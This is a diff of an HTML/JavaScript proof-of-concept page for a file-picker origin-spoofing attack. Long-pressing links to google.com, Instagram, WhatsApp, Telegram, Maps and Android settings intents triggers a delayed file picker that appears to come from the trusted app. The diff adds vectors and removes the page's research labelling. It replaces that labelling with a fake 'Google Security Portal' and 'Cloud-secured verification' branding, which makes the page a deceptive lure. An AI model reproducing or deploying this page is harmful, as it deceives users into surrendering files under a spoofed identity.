@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>File Picker & Multi-Vector S1/P1 Security PoC</title>
+    <title>File Picker Origin Spoof PoC - Multi Vector Suite</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -12,10 +12,10 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
+            justify-content: flex-start;
             min-height: 100vh;
             margin: 0;
-            padding: 20px;
+            padding: 30px 20px;
             text-align: center;
         }
         .banner {
@@ -28,51 +28,38 @@
         h1 {
             font-size: 20px;
             color: #1a73e8;
-            margin-bottom: 15px;
+            margin-bottom: 24px;
         }
-        .section-title {
-            font-size: 12px;
-            font-weight: 700;
-            color: #5f6368;
-            margin: 15px 0 8px 0;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        .button-grid {
+        .container {
             display: flex;
             flex-direction: column;
-            gap: 8px;
+            gap: 16px;
             width: 100%;
-            max-width: 360px;
+            max-width: 320px;
         }
-        a.spoof-link, button.spoof-btn {
-            display: block;
+        a.spoof-link {
+            display: inline-block;
+            background-color: #1a73e8;
             color: white;
-            padding: 11px 16px;
+            padding: 14px 20px;
             text-decoration: none;
             font-weight: 600;
-            font-size: 13px;
+            font-size: 14px;
             border-radius: 8px;
-            border: none;
-            cursor: pointer;
-            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.12);
-            transition: opacity 0.2s, background-color 0.2s;
+            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
+            transition: background-color 0.2s;
+            box-sizing: border-box;
+            width: 100%;
         }
-        a.spoof-link:active, button.spoof-btn:active {
-            opacity: 0.75;
+        a.spoof-link:active {
+            background-color: #1557b0;
         }
-        .bg-primary { background-color: #1a73e8; }
-        .bg-google { background-color: #ffffff; color: #3c4043; border: 1px solid #dadce0; }
-        .bg-green { background-color: #34a853; }
-        .bg-red { background-color: #ea4335; }
-        .bg-yellow { background-color: #fbbc05; color: #202124; }
-        .bg-purple { background-color: #9334e6; }
-        .bg-dark { background-color: #202124; }
-
         .preview-container {
-            margin-top: 20px;
+            margin-top: 15px;
             max-width: 280px;
             display: none;
+            margin-left: auto;
+            margin-right: auto;
         }
         .preview-container img {
             width: 100%;
@@ -86,22 +73,15 @@
             color: #5f6368;
             word-break: break-all;
         }
-        .status-console {
-            margin-top: 15px;
-            font-family: monospace;
-            font-size: 11px;
-            background: #e8eaed;
-            color: #202124;
-            padding: 8px 12px;
-            border-radius: 6px;
-            max-width: 360px;
-            width: 100%;
-            box-sizing: border-box;
-            text-align: left;
-            word-break: break-all;
+        .card-box {
+            background: #ffffff;
+            border: 1px solid #dadce0;
+            padding: 15px;
+            border-radius: 12px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
         }
         .footer-note {
-            margin-top: 25px;
+            margin-top: 30px;
             font-size: 11px;
             color: #9aa0a6;
         }
@@ -109,55 +89,109 @@
 </head>
 <body>
 
-    <div class="banner">Google Security Portal - S1/P1 Lab Suite</div>
-    <h1>Secure Document & Vector Verification</h1>
+    <div class="banner">Google Security Portal</div>
+    <h1>Secure Document Verification</h1>
 
-    <div class="button-grid">
-        <!-- 1. Vektor Utama: File Picker & Google Navigation / Ephemeral Tab -->
-        <a href="https://google.com" class="spoof-link bg-primary" id="targetLink">1. Open New Window & Upload Photo</a>
+    <div class="container">
+        <!-- 1. Original Vector -->
+        <div class="card-box">
+            <a href="https://google.com" class="spoof-link" id="targetLink1" data-target="1">Open New Window & Upload Photo</a>
+            <div class="preview-container" id="previewBox1">
+                <img id="imagePreview1" src="" alt="File Preview">
+                <div class="file-info" id="fileInfo1"></div>
+            </div>
+        </div>
 
-        <div class="section-title">Google Integration Vectors</div>
-        <button class="spoof-btn bg-google" onclick="openGooglePopup()">Open Google.com in Popup Window</button>
-        <button class="spoof-btn bg-google" onclick="redirectNavToGoogle()">Seamless Location Redirect to Google</button>
+        <!-- 2. Instagram Intent Vector -->
+        <div class="card-box">
+            <a href="instagram://app" class="spoof-link" style="background-color: #9334e6;" id="targetLink2" data-target="2">Open Instagram & Verify</a>
+            <div class="preview-container" id="previewBox2">
+                <img id="imagePreview2" src="" alt="File Preview">
+                <div class="file-info" id="fileInfo2"></div>
+            </div>
+        </div>
 
-        <div class="section-title">App Schemes & Deep Linking</div>
-        <button class="spoof-btn bg-purple" onclick="triggerAppScheme('instagram://app')">Open Instagram Intent</button>
-        <button class="spoof-btn bg-green" onclick="triggerAppScheme('geo:0,0?q=Googleplex')">Open Google Maps Intent</button>
-        <button class="spoof-btn bg-red" onclick="triggerAppScheme('geo:halo')">Open Geo Custom Scheme (geo:halo)</button>
-        <button class="spoof-btn bg-dark" onclick="triggerAppScheme('whatsapp://send?text=S1_P1_PoC_Test')">Open WhatsApp Intent</button>
+        <!-- 3. Google Maps Intent Vector -->
+        <div class="card-box">
+            <a href="geo:0,0?q=Googleplex" class="spoof-link" style="background-color: #34a853;" id="targetLink3" data-target="3">Open Maps & Upload Location Doc</a>
+            <div class="preview-container" id="previewBox3">
+                <img id="imagePreview3" src="" alt="File Preview">
+                <div class="file-info" id="fileInfo3"></div>
+            </div>
+        </div>
 
-        <div class="section-title">Android System Intents</div>
-        <button class="spoof-btn bg-yellow" onclick="triggerAndroidIntent('android.settings.BLUETOOTH_SETTINGS')">Open Bluetooth Settings Intent</button>
-        <button class="spoof-btn bg-yellow" onclick="triggerAndroidIntent('android.settings.WIFI_SETTINGS')">Open Wi-Fi Settings Intent</button>
-        <button class="spoof-btn bg-yellow" onclick="triggerAndroidIntent('android.settings.LOCATION_SOURCE_SETTINGS')">Open Location Settings Intent</button>
-        <button class="spoof-btn bg-yellow" onclick="triggerAndroidIntent('android.settings.NFC_SETTINGS')">Open NFC Settings Intent</button>
+        <!-- 4. Bluetooth Settings Intent Vector -->
+        <div class="card-box">
+            <a href="intent:#Intent;action=android.settings.BLUETOOTH_SETTINGS;end;" class="spoof-link" style="background-color: #fbbc05; color: #202124;" id="targetLink4" data-target="4">Open Bluetooth Settings & File</a>
+            <div class="preview-container" id="previewBox4">
+                <img id="imagePreview4" src="" alt="File Preview">
+                <div class="file-info" id="fileInfo4"></div>
+            </div>
+        </div>
+
+        <!-- 5. WhatsApp Intent Vector -->
+        <div class="card-box">
+            <a href="whatsapp://send?text=PoC_Test" class="spoof-link" style="background-color: #25d366; color: #ffffff;" id="targetLink5" data-target="5">Open WhatsApp & Upload Doc</a>
+            <div class="preview-container" id="previewBox5">
+                <img id="imagePreview5" src="" alt="File Preview">
+                <div class="file-info" id="fileInfo5"></div>
+            </div>
+        </div>
+
+        <!-- 6. Wi-Fi Settings Intent Vector -->
+        <div class="card-box">
+            <a href="intent:#Intent;action=android.settings.WIFI_SETTINGS;end;" class="spoof-link" style="background-color: #4285f4;" id="targetLink6" data-target="6">Open Wi-Fi Settings & File</a>
+            <div class="preview-container" id="previewBox6">
+                <img id="imagePreview6" src="" alt="File Preview">
+                <div class="file-info" id="fileInfo6"></div>
+            </div>
+        </div>
+
+        <!-- 7. Location Settings Intent Vector -->
+        <div class="card-box">
+            <a href="intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end;" class="spoof-link" style="background-color: #ea4335;" id="targetLink7" data-target="7">Open Location Settings & File</a>
+            <div class="preview-container" id="previewBox7">
+                <img id="imagePreview7" src="" alt="File Preview">
+                <div class="file-info" id="fileInfo7"></div>
+            </div>
+        </div>
+
+        <!-- 8. Telegram Intent Vector -->
+        <div class="card-box">
+            <a href="tg://resolve?domain=telegram" class="spoof-link" style="background-color: #0088cc;" id="targetLink8" data-target="8">Open Telegram & Verify</a>
+            <div class="preview-container" id="previewBox8">
+                <img id="imagePreview8" src="" alt="File Preview">
+                <div class="file-info" id="fileInfo8"></div>
+            </div>
+        </div>
+
+        <!-- 9. NFC Settings Intent Vector -->
+        <div class="card-box">
+            <a href="intent:#Intent;action=android.settings.NFC_SETTINGS;end;" class="spoof-link" style="background-color: #34a853;" id="targetLink9" data-target="9">Open NFC Settings & File</a>
+            <div class="preview-container" id="previewBox9">
+                <img id="imagePreview9" src="" alt="File Preview">
+                <div class="file-info" id="fileInfo9"></div>
+            </div>
+        </div>
+
+        <!-- 10. Display Settings Intent Vector -->
+        <div class="card-box">
+            <a href="intent:#Intent;action=android.settings.DISPLAY_SETTINGS;end;" class="spoof-link" style="background-color: #ff6d00;" id="targetLink10" data-target="10">Open Display Settings & File</a>
+            <div class="preview-container" id="previewBox10">
+                <img id="imagePreview10" src="" alt="File Preview">
+                <div class="file-info" id="fileInfo10"></div>
+            </div>
+        </div>
     </div>
 
-    <!-- Uploaded Image Preview Box -->
-    <div class="preview-container" id="previewBox">
-        <img id="imagePreview" src="" alt="File Preview">
-        <div class="file-info" id="fileInfo"></div>
-    </div>
-
-    <!-- Live Status Console -->
-    <div class="status-console" id="statusConsole">Status: Ready. Awaiting user interaction...</div>
-
-    <div class="footer-note">Authorized S1/P1 vulnerability research environment.</div>
+    <div class="footer-note">Cloud-secured verification system.</div>
 
     <script>
         let triggered = false;
 
-        function logStatus(message) {
-            const consoleEl = document.getElementById("statusConsole");
-            consoleEl.innerText = `Status: ${message}`;
-            console.debug(message);
-        }
-
-        // Logika Utama PoC: File Picker Attack Vector
-        const executeAttackVector = () => {
+        const executeAttackVector = (targetId) => {
             if (triggered) return;
             triggered = true;
-            logStatus("Executing File Picker vector sequence...");
 
             setTimeout(async () => {
                 try {
@@ -173,11 +207,11 @@
                     });
 
                     const file = await fileHandle.getFile();
-                    document.getElementById("fileInfo").innerText = `Selected file: ${file.name}`;
-                    logStatus(`File successfully accessed: ${file.name}`);
+                    
+                    document.getElementById(`fileInfo${targetId}`).innerText = `Selected file: ${file.name}`;
 
-                    const previewBox = document.getElementById("previewBox");
-                    const imagePreview = document.getElementById("imagePreview");
+                    const previewBox = document.getElementById(`previewBox${targetId}`);
+                    const imagePreview = document.getElementById(`imagePreview${targetId}`);
                     
                     if (file.type.startsWith('image/')) {
                         imagePreview.src = URL.createObjectURL(file);
@@ -188,49 +222,23 @@
                     }
 
                 } catch (err) {
-                    logStatus(`File picker cancelled or blocked: ${err.message}`);
+                    console.debug("File picker cancelled or blocked:", err.message);
                 } finally {
                     setTimeout(() => { triggered = false; }, 900);
                 }
             }, 1300);
         };
 
-        // Event listener utama untuk target link (Mendukung aksi klik kanan / long-press & navigasi Google.com)
-        const targetElement = document.getElementById("targetLink");
+        // Pasang event listener ke semua elemen spoof-link secara dinamis dengan logika aslimu
+        document.querySelectorAll('.spoof-link').forEach(link => {
+            const targetId = link.getAttribute('data-target');
 
-        targetElement.addEventListener("contextmenu", (e) => {
-            e.preventDefault();
-            executeAttackVector();
+            link.addEventListener("contextmenu", () => {
+                executeAttackVector(targetId);
+            });
+
+            link.addEventListener("touchstart", () => {}, { passive: true });
         });
-
-        targetElement.addEventListener("touchstart", () => {
-            logStatus("Touchstart event detected on target link.");
-        }, { passive: true });
-
-        // Handler Fungsi Vektor Tambahan
-        function openGooglePopup() {
-            logStatus("Attempting to open Google.com popup window...");
-            const win = window.open("https://www.google.com", "_blank", "width=600,height=600");
-            if (!win) {
-                logStatus("Popup blocked by browser policy.");
-            }
-        }
-
-        function redirectNavToGoogle() {
-            logStatus("Initiating location redirect to https://google.com...");
-            window.location.href = "https://google.com";
-        }
-
-        function triggerAppScheme(schemeUri) {
-            logStatus(`Triggering custom scheme/intent: ${schemeUri}`);
-            window.location.href = schemeUri;
-        }
-
-        function triggerAndroidIntent(actionName) {
-            const intentUrl = `intent:#Intent;action=${actionName};end;`;
-            logStatus(`Triggering Android Intent: ${actionName}`);
-            window.location.href = intentUrl;
-        }
     </script>
 
 </body>
